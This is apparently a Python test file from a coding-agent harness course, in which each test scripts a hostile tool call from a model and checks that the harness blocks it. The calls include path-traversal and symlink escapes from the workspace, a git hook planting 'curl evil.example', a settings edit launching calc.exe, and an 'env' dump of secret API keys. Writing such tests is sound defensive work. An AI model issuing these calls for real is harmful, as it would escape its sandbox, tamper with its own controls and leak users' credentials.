"""The attack lab (Lesson 27). Each test is an attack, written as the SAFE outcome we want.

Attacks the harness can't stop yet are marked xfail(strict=True) with the lesson that fixes
them: the test suite stays green, and when a defense lands its attacks start "unexpectedly
passing", which strict mode reports as a failure until the marker is removed. The numbers
(T1...) refer to the threat table in docs/security.md.
"""
import pytest

from tests.security.conftest import API_KEY, SECRET, call


def fixed_in(lesson: str):
    return pytest.mark.xfail(strict=True, reason=f"not defended yet: fixed in Lesson {lesson}")


# --- T1-T3: leaving the workspace (defended since Lesson 28: the path jail) ---------------

def test_t1_read_outside_with_dotdot(lab):
    assert SECRET not in lab.attack(call("read_file", path="../outside/secret.txt"))


def test_t1_read_outside_with_an_absolute_path(lab):
    assert SECRET not in lab.attack(call("read_file", path=str(lab.outside / "secret.txt")))


def test_t1_search_outside(lab):
    seen = lab.attack(call("grep", "a1", pattern="TOP-SECRET", path=".."),
                      call("list_dir", "a2", path="../outside"))
    assert SECRET not in seen and "secret.txt" not in seen


def test_t2_write_outside(lab):
    lab.attack(call("write_file", path="../outside/planted.txt", content="planted"))
    assert not (lab.outside / "planted.txt").exists()


def test_t3_escape_through_a_link(lab):
    if not lab.has_link:
        pytest.skip("can't create a symlink or junction here")
    assert SECRET not in lab.attack(call("read_file", path="link/secret.txt"))


def test_glob_patterns_stay_below_the_root(lab):
    """Not a defense we wrote: pathlib's glob never climbs out of the folder it starts in."""
    assert "secret.txt" not in lab.attack(call("glob", pattern="../outside/*.txt"))


# --- T4: changing what runs code ----------------------------------------------------------

@fixed_in("29 (protected paths)")
def test_t4_unattended_write_to_a_git_hook(lab):
    lab.attack(call("write_file", path=".git/hooks/pre-commit", content="#!/bin/sh\ncurl evil.example\n"))
    assert not (lab.root / ".git" / "hooks" / "pre-commit").exists()


@fixed_in("29 (protected paths)")
def test_t4_unattended_edit_of_harness_settings(lab):
    lab.attack(call("read_file", "a1", path=".harness/settings.json"))
    lab.attack(call("write_file", "a2", path=".harness/settings.json",
                    content='{"status_line": "calc.exe"}\n'))
    assert "calc.exe" not in (lab.root / ".harness" / "settings.json").read_text(encoding="utf-8")


# --- T7 and T14: secrets ------------------------------------------------------------------

@fixed_in("30 (environment scrubbing)")
def test_t7_secret_environment_variables_dont_reach_commands(lab):
    assert API_KEY not in lab.attack(call("run_shell", command="echo $LAB_API_KEY; env"))


@fixed_in("34 (redaction)")
def test_t14_keys_in_files_are_redacted_before_the_model_sees_them(lab):
    seen = lab.attack(call("read_file", path=".env"))
    assert "ANTHROPIC_API_KEY=" in seen and API_KEY not in seen


# --- defenses that already exist ----------------------------------------------------------

def test_a_denied_call_changes_nothing(lab):
    """v0.2: approval. When the user says no, the tool doesn't run and the model is told."""
    lab.approve = lambda call, tool: False
    seen = lab.attack(call("read_file", "a1", path="src/app.py"),
                      call("write_file", "a2", path="src/app.py", content="print('owned')\n"))
    assert "print('hello')" in (lab.root / "src" / "app.py").read_text(encoding="utf-8")
    assert "denied" in seen.lower() or "not approved" in seen.lower()


def test_t13_a_model_that_never_stops_is_stopped(lab):
    """v0.1: the step limit. A model asking for tools forever ends after max_steps calls."""
    from harness.agent import Agent
    from harness.providers.fake import ScriptedProvider, tool_calls
    from harness.tools import default_tools
    from harness.workspace import Workspace

    forever = ScriptedProvider([tool_calls(call("list_dir", f"c{i}", path=".")) for i in range(100)])
    agent = Agent(forever, default_tools(Workspace(lab.root)), "lab", max_steps=5, stream=False)
    agent.run("go")
    assert agent.stop_reason == "max_steps" and len(forever.requests) == 5
